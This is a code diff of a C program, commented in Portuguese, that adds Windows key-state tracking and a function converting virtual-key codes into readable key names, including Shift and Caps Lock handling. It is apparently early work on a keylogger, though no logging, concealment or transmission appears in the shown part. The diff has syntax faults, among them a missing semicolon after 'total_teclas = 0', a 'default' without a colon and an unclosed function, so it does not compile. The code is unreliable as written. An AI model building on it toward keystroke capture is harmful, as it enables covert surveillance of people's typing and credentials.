@@ -1,15 +1,21 @@
 #include <stdio.h>
 #include <windows.h> //para usar a api do windows
 
-#define MAX_TECLAS 90 
+#define MAX_TECLAS 90 // o total de teclas que seram monitoradas
 
 typedef struct {
     int vk;
     int estava_pressionada;
 } EstadoTecla;
 
+EstadoTecla teclas[MAX_TECLAS]; // vetor para armazenar todas as teclas monitoradas
+int total_teclas = 0 // variavel usada na função AdicionarTecla
+
+
+// essa função torna humanamente legível o código vk das teclas
 void VKParaString(int vk, char *buffer) {
     switch (vk) {
+        // primeira parte contendo as teclas especiais
         case VK_SPACE:      strcpy(buffer, "ESPACO");    break;
         case VK_RETURN:     strcpy(buffer, "ENTER");     break;
         case VK_BACK:       strcpy(buffer, "BACKSPACE"); break;
@@ -29,6 +35,24 @@ void VKParaString(int vk, char *buffer) {
         case VK_F9:  case VK_F10: case VK_F11: case VK_F12:
             sprintf(buffer, "F%d", vk - VK_F1 + 1);
             break;
+        default
+            // numeros e letras
+            if (vk >= '0' && vk <= '9') {
+                buffer[0] = (char)vk; buffer[1] = '\0';
+            } else if (vk >= 'A' && vk <= 'Z') {
+                // validação usada para diferenciar maiúsculas de minúsculas
+                // primeiro uso das funções da api win32
+                int shift = (GetAsyncKeyState(VK_SHIFT) & 0X8000) ? 1 : 0; 
+                int caps = (GetKeyState(VK_CAPITAL) & 0x0001) ? 1 : 0;
+                buffer[0] = (shift ^ caps) ? (char)vk : (char)(vk + 32);
+                buffer[1] = '\0';
+            } else {
+                // registra o código vk se não existir tradução
+                // caso adicionar tecla que ainda não possui tradução
+                sprintf(buffer, "VK_%d",vk);
+            }
+            break;
+    }
 }
 
 
